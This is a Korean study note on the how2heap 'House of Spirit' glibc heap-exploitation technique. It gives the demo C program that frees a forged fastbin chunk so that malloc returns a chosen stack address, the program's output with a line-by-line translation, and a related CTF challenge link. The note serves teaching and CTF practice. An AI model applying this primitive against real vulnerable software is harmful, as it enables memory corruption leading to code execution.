# How2Heap Study 05 House Of Spirit

## Tech Overview

Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.

## Source

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size

	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
	fake_chunks[9] = 0x1234; // nextsize

	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

## Output

```
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7fffd6d63538 and the second at 0x7fffd6d63568.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffd6d63538.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7fffd6d63538, which will be 0x7fffd6d63540!
malloc(0x30): 0x7fffd6d63540
```

## 개요 번역

Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.
malloc이 임의에 가까운 포인터를 반환하도록 가짜 fastbin 청크를 해제하는 것입니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
This file demonstrates the house of spirit attack.
이 파일은 house of spirit 공격을 시연합니다.

Calling malloc() once so that it sets up its memory.
malloc 을 호출하여 메모리를 할당하도록 합니다.

We will now overwrite a pointer to point to a fake 'fastbin' region.
우리는 이제 가짜 'fastbin' 을 가리키도록 포인터를 덮어쓸 것입니다.

This region (memory of length: 80) contains two chunks. The first starts at 0x7fffd6d63538 and the second at 0x7fffd6d63568.
이 공간은 (메모리의 길이 : 80) 두 개의 청크를 가지고 있습니다. 첫 번째는 0x7fffd6d63538 에서 시작하고, 두 번째는 0x7fffd6d63568 에서 시작합니다.

This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64).
fastbin 카테고리로 분별되는 동안 (x64 시스템에서는 128 이하) 이 청크의 chunk.size 값은 이 청크의 크기보다 16 더 큰 값입니다. (청크 데이터를 수용하기 위해서)

The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
PREV_INUSE 비트는 fastbin 에 속하는 크기인 청크에서 free에 의해 무시되며, IS_MMAPPED 와 NON_MAIN_ARENA 비트가 문제를 부릅니다.

... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation.
... 노트 : 이 것은 malloc 의 구현에 의해 내부 값으로 올림 되어 다음 malloc 요청이 있을 때 반환 값을 결정하는데 사용되는 크기가 됩니다.

E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
예시로 x64 시스템에서는, 0x30 에서 0x38 은 모두 0x40 으로 올림되며, 그것들은 마지막에 malloc 의 매개 변수로 사용될 것입니다.

The chunk.size of the *next* fake region has to be sane.
가짜 구역의 chunk.size 값은 이상이 없어야 합니다.

That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks.
이 값이 다음 크기의 무결성 검사를 통과히기 위해서는 2 * SIZE_SZ (x64 시스템에서는 16) 값보다 커야하고, av->system_mem (main arena의 기본은 128kb)보다 작아야 합니다.

No need for fastbin size.
fastbin 의 크기는 필요 없습니다.

Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffd6d63538.
이제 포인터에 가짜 구역의 가짜 첫 번째 청크의 주소인 0x7fffd6d63538 값을 넣습니다.

... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
... 노트 : 구역과 관련된 주소들은 16 바이트 단위로 정렬되어 있어야 합니다.

Freeing the overwritten pointer.
덮어쓴 포인터를 할당 해제합니다.

Now the next malloc will return the region of our fake chunk at 0x7fffd6d63538, which will be 0x7fffd6d63540!
이제 다음 malloc 는 0x7fffd6d63538 에 있는 가짜 청크의 0x7fffd6d63540 구역을 리턴해 줍니다.

malloc(0x30): 0x7fffd6d63540
```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* hack.lu CTF 2014-OREO [블로그]() / [바이너리](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo)